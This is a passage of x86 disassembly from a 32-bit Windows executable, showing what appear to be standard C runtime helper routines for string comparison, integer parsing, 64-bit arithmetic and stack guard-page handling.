  426cd3:	call   DWORD PTR ds:0x428054
  426cd9:	mov    esi,eax
  426cdb:	cmp    esi,edi
  426cdd:	je     0x426d22
  426cdf:	push   esi
  426ce0:	push   0x1
  426ce2:	call   0x4249c8
  426ce7:	pop    ecx
  426ce8:	pop    ecx
  426ce9:	mov    DWORD PTR [ebp-0x20],eax
  426cec:	cmp    eax,edi
  426cee:	je     0x426d22
  426cf0:	push   edi
  426cf1:	push   edi
  426cf2:	push   esi
  426cf3:	push   eax
  426cf4:	push   esi
  426cf5:	push   ebx
  426cf6:	push   edi
  426cf7:	push   DWORD PTR [ebp+0xc]
  426cfa:	call   DWORD PTR ds:0x428054
  426d00:	cmp    eax,edi
  426d02:	jne    0x426d12
  426d04:	push   DWORD PTR [ebp-0x20]
  426d07:	call   0x4244ba
  426d0c:	pop    ecx
  426d0d:	mov    DWORD PTR [ebp-0x20],edi
  426d10:	jmp    0x426d22
  426d12:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426d16:	je     0x426d22
  426d18:	mov    ecx,DWORD PTR [ebp+0x14]
  426d1b:	mov    DWORD PTR [ecx],eax
  426d1d:	jmp    0x426d22
  426d1f:	mov    ebx,DWORD PTR [ebp-0x48]
  426d22:	cmp    DWORD PTR [ebp-0x24],edi
  426d25:	je     0x426d2e
  426d27:	push   ebx
  426d28:	call   0x4244ba
  426d2d:	pop    ecx
  426d2e:	mov    eax,DWORD PTR [ebp-0x20]
  426d31:	lea    esp,[ebp-0x54]
  426d34:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d37:	xor    ecx,DWORD PTR [ebp+0x4]
  426d3a:	call   0x423f7c
  426d3f:	call   0x4238e3
  426d44:	ret    
  426d45:	push   ebp
  426d46:	mov    ebp,esp
  426d48:	sub    esp,0x48
  426d4b:	push   ebx
  426d4c:	push   esi
  426d4d:	push   edi
  426d4e:	push   0x4
  426d50:	pop    eax
  426d51:	call   0x423900
  426d56:	mov    ebx,esp
  426d58:	push   0x1c
  426d5a:	lea    eax,[ebp-0x24]
  426d5d:	push   eax
  426d5e:	push   ebx
  426d5f:	call   DWORD PTR ds:0x4280f0
  426d65:	test   eax,eax
  426d67:	je     0x426dda
  426d69:	mov    edi,DWORD PTR [ebp-0x20]
  426d6c:	lea    eax,[ebp-0x48]
  426d6f:	push   eax
  426d70:	call   DWORD PTR ds:0x4280ec
  426d76:	mov    eax,DWORD PTR [ebp-0x44]
  426d79:	lea    esi,[eax-0x1]
  426d7c:	not    esi
  426d7e:	and    esi,ebx
  426d80:	sub    esi,eax
  426d82:	mov    DWORD PTR [ebp-0x4],eax
  426d85:	mov    eax,ds:0x45cac4
  426d8a:	mov    ecx,eax
  426d8c:	dec    ecx
  426d8d:	neg    ecx
  426d8f:	sbb    ecx,ecx
  426d91:	and    ecx,0xffff1000
  426d97:	add    ecx,0x11000
  426d9d:	add    ecx,edi
  426d9f:	cmp    esi,ecx
  426da1:	jb     0x426dda
  426da3:	cmp    eax,0x1
  426da6:	je     0x426df2
  426da8:	mov    ebx,edi
  426daa:	mov    edi,0x1000
  426daf:	push   0x1c
  426db1:	lea    eax,[ebp-0x24]
  426db4:	push   eax
  426db5:	push   ebx
  426db6:	call   DWORD PTR ds:0x4280f0
  426dbc:	test   eax,eax
  426dbe:	je     0x426dda
  426dc0:	add    ebx,DWORD PTR [ebp-0x18]
  426dc3:	test   DWORD PTR [ebp-0x14],edi
  426dc6:	je     0x426daf
  426dc8:	test   BYTE PTR [ebp-0xf],0x1
  426dcc:	mov    ebx,DWORD PTR [ebp-0x24]
  426dcf:	je     0x426dd6
  426dd1:	xor    eax,eax
  426dd3:	inc    eax
  426dd4:	jmp    0x426e0e
  426dd6:	cmp    esi,ebx
  426dd8:	jae    0x426dde
  426dda:	xor    eax,eax
  426ddc:	jmp    0x426e0e
  426dde:	push   0x4
  426de0:	push   edi
  426de1:	push   DWORD PTR [ebp-0x4]
  426de4:	push   ebx
  426de5:	call   DWORD PTR ds:0x4280b0
  426deb:	mov    eax,ds:0x45cac4
  426df0:	jmp    0x426df4
  426df2:	mov    ebx,esi
  426df4:	dec    eax
  426df5:	neg    eax
  426df7:	sbb    eax,eax
  426df9:	and    eax,0x103
  426dfe:	lea    ecx,[ebp-0x8]
  426e01:	push   ecx
  426e02:	inc    eax
  426e03:	push   eax
  426e04:	push   DWORD PTR [ebp-0x4]
  426e07:	push   ebx
  426e08:	call   DWORD PTR ds:0x4280e8
  426e0e:	lea    esp,[ebp-0x54]
  426e11:	pop    edi
  426e12:	pop    esi
  426e13:	pop    ebx
  426e14:	leave  
  426e15:	ret    
  426e16:	int3   
  426e17:	int3   
  426e18:	int3   
  426e19:	int3   
  426e1a:	int3   
  426e1b:	int3   
  426e1c:	int3   
  426e1d:	int3   
  426e1e:	int3   
  426e1f:	int3   
  426e20:	push   ebp
  426e21:	mov    ebp,esp
  426e23:	push   edi
  426e24:	push   esi
  426e25:	push   ebx
  426e26:	mov    esi,DWORD PTR [ebp+0xc]
  426e29:	mov    edi,DWORD PTR [ebp+0x8]
  426e2c:	mov    al,0xff
  426e2e:	mov    edi,edi
  426e30:	or     al,al
  426e32:	je     0x426e66
  426e34:	mov    al,BYTE PTR [esi]
  426e36:	add    esi,0x1
  426e39:	mov    ah,BYTE PTR [edi]
  426e3b:	add    edi,0x1
  426e3e:	cmp    ah,al
  426e40:	je     0x426e30
  426e42:	sub    al,0x41
  426e44:	cmp    al,0x1a
  426e46:	sbb    cl,cl
  426e48:	and    cl,0x20
  426e4b:	add    al,cl
  426e4d:	add    al,0x41
  426e4f:	xchg   al,ah
  426e51:	sub    al,0x41
  426e53:	cmp    al,0x1a
  426e55:	sbb    cl,cl
  426e57:	and    cl,0x20
  426e5a:	add    al,cl
  426e5c:	add    al,0x41
  426e5e:	cmp    al,ah
  426e60:	je     0x426e30
  426e62:	sbb    al,al
  426e64:	sbb    al,0xff
  426e66:	movsx  eax,al
  426e69:	pop    ebx
  426e6a:	pop    esi
  426e6b:	pop    edi
  426e6c:	leave  
  426e6d:	ret    
  426e6e:	push   esi
  426e6f:	push   edi
  426e70:	call   0x42375d
  426e75:	mov    edi,DWORD PTR [eax+0x64]
  426e78:	cmp    edi,DWORD PTR ds:0x45c58c
  426e7e:	je     0x426e87
  426e80:	call   0x424c0f
  426e85:	mov    edi,eax
  426e87:	mov    esi,DWORD PTR [esp+0xc]
  426e8b:	cmp    DWORD PTR [edi+0x28],0x1
  426e8f:	movzx  eax,BYTE PTR [esi]
  426e92:	jle    0x426ea2
  426e94:	push   0x8
  426e96:	push   eax
  426e97:	push   edi
  426e98:	call   0x426ef6
  426e9d:	add    esp,0xc
  426ea0:	jmp    0x426eac
  426ea2:	mov    ecx,DWORD PTR [edi+0x48]
  426ea5:	movzx  eax,BYTE PTR [ecx+eax*2]
  426ea9:	and    eax,0x8
  426eac:	test   eax,eax
  426eae:	je     0x426eb3
  426eb0:	inc    esi
  426eb1:	jmp    0x426e8b
  426eb3:	movzx  ecx,BYTE PTR [esi]
  426eb6:	inc    esi
  426eb7:	cmp    ecx,0x2d
  426eba:	mov    edx,ecx
  426ebc:	je     0x426ec3
  426ebe:	cmp    ecx,0x2b
  426ec1:	jne    0x426ec7
  426ec3:	movzx  ecx,BYTE PTR [esi]
  426ec6:	inc    esi
  426ec7:	xor    eax,eax
  426ec9:	cmp    ecx,0x30
  426ecc:	jl     0x426ed8
  426ece:	cmp    ecx,0x39
  426ed1:	jg     0x426ed8
  426ed3:	sub    ecx,0x30
  426ed6:	jmp    0x426edb
  426ed8:	or     ecx,0xffffffff
  426edb:	cmp    ecx,0xffffffff
  426ede:	je     0x426eec
  426ee0:	lea    eax,[eax+eax*4]
  426ee3:	lea    eax,[ecx+eax*2]
  426ee6:	movzx  ecx,BYTE PTR [esi]
  426ee9:	inc    esi
  426eea:	jmp    0x426ec9
  426eec:	cmp    edx,0x2d
  426eef:	pop    edi
  426ef0:	pop    esi
  426ef1:	jne    0x426ef5
  426ef3:	neg    eax
  426ef5:	ret    
  426ef6:	push   ebp
  426ef7:	mov    ebp,esp
  426ef9:	push   ecx
  426efa:	mov    eax,DWORD PTR [ebp+0xc]
  426efd:	lea    ecx,[eax+0x1]
  426f00:	cmp    ecx,0x100
  426f06:	mov    ecx,DWORD PTR [ebp+0x8]
  426f09:	ja     0x426f14
  426f0b:	mov    ecx,DWORD PTR [ecx+0x48]
  426f0e:	movzx  eax,WORD PTR [ecx+eax*2]
  426f12:	jmp    0x426f68
  426f14:	push   esi
  426f15:	mov    edx,eax
  426f17:	sar    edx,0x8
  426f1a:	push   edi
  426f1b:	mov    edi,DWORD PTR [ecx+0x48]
  426f1e:	movzx  esi,dl
  426f21:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426f26:	pop    edi
  426f27:	pop    esi
  426f28:	je     0x426f39
  426f2a:	and    BYTE PTR [ebp-0x2],0x0
  426f2e:	push   0x2
  426f30:	mov    BYTE PTR [ebp-0x3],al
  426f33:	mov    BYTE PTR [ebp-0x4],dl
  426f36:	pop    eax
  426f37:	jmp    0x426f43
  426f39:	and    BYTE PTR [ebp-0x3],0x0
  426f3d:	mov    BYTE PTR [ebp-0x4],al
  426f40:	xor    eax,eax
  426f42:	inc    eax
  426f43:	push   0x1
  426f45:	push   DWORD PTR [ecx+0x14]
  426f48:	push   DWORD PTR [ecx+0x4]
  426f4b:	lea    ecx,[ebp+0xe]
  426f4e:	push   ecx
  426f4f:	push   eax
  426f50:	lea    eax,[ebp-0x4]
  426f53:	push   eax
  426f54:	push   0x1
  426f56:	call   0x425fd8
  426f5b:	add    esp,0x1c
  426f5e:	test   eax,eax
  426f60:	jne    0x426f64
  426f62:	leave  
  426f63:	ret    
  426f64:	movzx  eax,WORD PTR [ebp+0xe]
  426f68:	and    eax,DWORD PTR [ebp+0x10]
  426f6b:	leave  
  426f6c:	ret    
  426f6d:	int3   
  426f6e:	int3   
  426f6f:	int3   
  426f70:	mov    eax,DWORD PTR [esp+0x8]
  426f74:	mov    ecx,DWORD PTR [esp+0x10]
  426f78:	or     ecx,eax
  426f7a:	mov    ecx,DWORD PTR [esp+0xc]
  426f7e:	jne    0x426f89
  426f80:	mov    eax,DWORD PTR [esp+0x4]
  426f84:	mul    ecx
  426f86:	ret    0x10
  426f89:	push   ebx
  426f8a:	mul    ecx
  426f8c:	mov    ebx,eax
  426f8e:	mov    eax,DWORD PTR [esp+0x8]
  426f92:	mul    DWORD PTR [esp+0x14]
  426f96:	add    ebx,eax
  426f98:	mov    eax,DWORD PTR [esp+0x8]
  426f9c:	mul    ecx
  426f9e:	add    edx,ebx
  426fa0:	pop    ebx
  426fa1:	ret    0x10
  426fa4:	int3   
  426fa5:	int3   
  426fa6:	int3   
  426fa7:	int3   
  426fa8:	int3   
  426fa9:	int3   
  426faa:	int3   
  426fab:	int3   
  426fac:	int3   
  426fad:	int3   
  426fae:	int3   
  426faf:	int3   
  426fb0:	push   ebp
  426fb1:	mov    ebp,esp
  426fb3:	push   edi
  426fb4:	push   esi
  426fb5:	push   ebx
  426fb6:	mov    ecx,DWORD PTR [ebp+0x10]
  426fb9:	or     ecx,ecx
  426fbb:	je     0x42700a
  426fbd:	mov    esi,DWORD PTR [ebp+0x8]
  426fc0:	mov    edi,DWORD PTR [ebp+0xc]
  426fc3:	mov    bh,0x41
  426fc5:	mov    bl,0x5a
  426fc7:	mov    dh,0x20
  426fc9:	lea    ecx,[ecx+0x0]
  426fcc:	mov    ah,BYTE PTR [esi]
  426fce:	or     ah,ah
  426fd0:	mov    al,BYTE PTR [edi]
  426fd2:	je     0x426ffb
  426fd4:	or     al,al
  426fd6:	je     0x426ffb
  426fd8:	add    esi,0x1
  426fdb:	add    edi,0x1
  426fde:	cmp    ah,bh
  426fe0:	jb     0x426fe8
  426fe2:	cmp    ah,bl
  426fe4:	ja     0x426fe8
  426fe6:	add    ah,dh
  426fe8:	cmp    al,bh
  426fea:	jb     0x426ff2
  426fec:	cmp    al,bl
  426fee:	ja     0x426ff2
  426ff0:	add    al,dh
  426ff2:	cmp    ah,al
  426ff4:	jne    0x427001
  426ff6:	sub    ecx,0x1
  426ff9:	jne    0x426fcc
  426ffb:	xor    ecx,ecx
  426ffd:	cmp    ah,al
  426fff:	je     0x42700a
  427001:	mov    ecx,0xffffffff
  427006:	jb     0x42700a
  427008:	neg    ecx
  42700a:	mov    eax,ecx
  42700c:	pop    ebx
  42700d:	pop    esi
  42700e:	pop    edi
  42700f:	leave  
  427010:	ret    
  427011:	int3   
  427012:	int3   
  427013:	int3   
  427014:	int3   
  427015:	int3   
  427016:	int3   
  427017:	int3   
  427018:	int3   
  427019:	int3   
  42701a:	int3   
  42701b:	int3   
  42701c:	int3   
  42701d:	int3   
  42701e:	int3   
  42701f:	int3   
  427020:	push   esi
  427021:	mov    eax,DWORD PTR [esp+0x14]
  427025:	or     eax,eax
  427027:	jne    0x427051
  427029:	mov    ecx,DWORD PTR [esp+0x10]
  42702d:	mov    eax,DWORD PTR [esp+0xc]
  427031:	xor    edx,edx
  427033:	div    ecx
  427035:	mov    ebx,eax
  427037:	mov    eax,DWORD PTR [esp+0x8]
  42703b:	div    ecx
  42703d:	mov    esi,eax
  42703f:	mov    eax,ebx
  427041:	mul    DWORD PTR [esp+0x10]
  427045:	mov    ecx,eax
  427047:	mov    eax,esi
  427049:	mul    DWORD PTR [esp+0x10]
  42704d:	add    edx,ecx
  42704f:	jmp    0x427098
  427051:	mov    ecx,eax
  427053:	mov    ebx,DWORD PTR [esp+0x10]
  427057:	mov    edx,DWORD PTR [esp+0xc]
  42705b:	mov    eax,DWORD PTR [esp+0x8]
  42705f:	shr    ecx,1
  427061:	rcr    ebx,1
  427063:	shr    edx,1
  427065:	rcr    eax,1
  427067:	or     ecx,ecx
  427069:	jne    0x42705f
  42706b:	div    ebx
  42706d:	mov    esi,eax
  42706f:	mul    DWORD PTR [esp+0x14]
  427073:	mov    ecx,eax
  427075:	mov    eax,DWORD PTR [esp+0x10]
  427079:	mul    esi
  42707b:	add    edx,ecx
  42707d:	jb     0x42708d
  42707f:	cmp    edx,DWORD PTR [esp+0xc]
  427083:	ja     0x42708d
  427085:	jb     0x427096
  427087:	cmp    eax,DWORD PTR [esp+0x8]
  42708b:	jbe    0x427096
  42708d:	dec    esi
  42708e:	sub    eax,DWORD PTR [esp+0x10]
  427092:	sbb    edx,DWORD PTR [esp+0x14]
  427096:	xor    ebx,ebx
  427098:	sub    eax,DWORD PTR [esp+0x8]
  42709c:	sbb    edx,DWORD PTR [esp+0xc]
  4270a0:	neg    edx
  4270a2:	neg    eax
  4270a4:	sbb    edx,0x0
  4270a7:	mov    ecx,edx
  4270a9:	mov    edx,ebx
  4270ab:	mov    ebx,ecx
  4270ad:	mov    ecx,eax
  4270af:	mov    eax,esi
  4270b1:	pop    esi
  4270b2:	ret    0x10
  4270b5:	int3   
  4270b6:	int3   
  4270b7:	int3   
  4270b8:	int3   
  4270b9:	int3   
  4270ba:	int3   
  4270bb:	int3   
  4270bc:	int3   
  4270bd:	int3   
  4270be:	int3   
  4270bf:	int3   
  4270c0:	lea    eax,[edx-0x1]
  4270c3:	pop    ebx
  4270c4:	ret    
  4270c5:	lea    esp,[esp+0x0]
  4270cc:	lea    esp,[esp+0x0]
  4270d0:	xor    eax,eax
  4270d2:	mov    al,BYTE PTR [esp+0x8]
  4270d6:	push   ebx
  4270d7:	mov    ebx,eax
  4270d9:	shl    eax,0x8
  4270dc:	mov    edx,DWORD PTR [esp+0x8]
  4270e0:	test   edx,0x3
  4270e6:	je     0x4270fd
  4270e8:	mov    cl,BYTE PTR [edx]
  4270ea:	add    edx,0x1
  4270ed:	cmp    cl,bl
  4270ef:	je     0x4270c0
  4270f1:	test   cl,cl
  4270f3:	je     0x427146
  4270f5:	test   edx,0x3
  4270fb:	jne    0x4270e8
  4270fd:	or     ebx,eax
  4270ff:	push   edi
  427100:	mov    eax,ebx
  427102:	shl    ebx,0x10
  427105:	push   esi
  427106:	or     ebx,eax
  427108:	mov    ecx,DWORD PTR [edx]
  42710a:	mov    edi,0x7efefeff
  42710f:	mov    eax,ecx
  427111:	mov    esi,edi
  427113:	xor    ecx,ebx
  427115:	add    esi,eax
  427117:	add    edi,ecx
  427119:	xor    ecx,0xffffffff
  42711c:	xor    eax,0xffffffff
  42711f:	xor    ecx,edi
  427121:	xor    eax,esi
  427123:	add    edx,0x4
  427126:	and    ecx,0x81010100
  42712c:	jne    0x42714a
  42712e:	and    eax,0x81010100
  427133:	je     0x427108
  427135:	and    eax,0x1010100
  42713a:	jne    0x427144
  42713c:	and    esi,0x80000000
  427142:	jne    0x427108
  427144:	pop    esi
  427145:	pop    edi
  427146:	pop    ebx
  427147:	xor    eax,eax
  427149:	ret    
  42714a:	mov    eax,DWORD PTR [edx-0x4]
  42714d:	cmp    al,bl
  42714f:	je     0x427187
  427151:	test   al,al
  427153:	je     0x427144
  427155:	cmp    ah,bl
  427157:	je     0x427180
  427159:	test   ah,ah
  42715b:	je     0x427144
  42715d:	shr    eax,0x10
  427160:	cmp    al,bl
  427162:	je     0x427179
  427164:	test   al,al
  427166:	je     0x427144
  427168:	cmp    ah,bl
  42716a:	je     0x427172
  42716c:	test   ah,ah
  42716e:	je     0x427144
  427170:	jmp    0x427108
  427172:	pop    esi
  427173:	pop    edi
  427174:	lea    eax,[edx-0x1]
  427177:	pop    ebx
  427178:	ret    
  427179:	lea    eax,[edx-0x2]
  42717c:	pop    esi
  42717d:	pop    edi
  42717e:	pop    ebx
  42717f:	ret    
  427180:	lea    eax,[edx-0x3]
  427183:	pop    esi
  427184:	pop    edi
  427185:	pop    ebx
  427186:	ret    
  427187:	lea    eax,[edx-0x4]
  42718a:	pop    esi
  42718b:	pop    edi
  42718c:	pop    ebx
  42718d:	ret    
  42718e:	jmp    DWORD PTR ds:0x4280e4
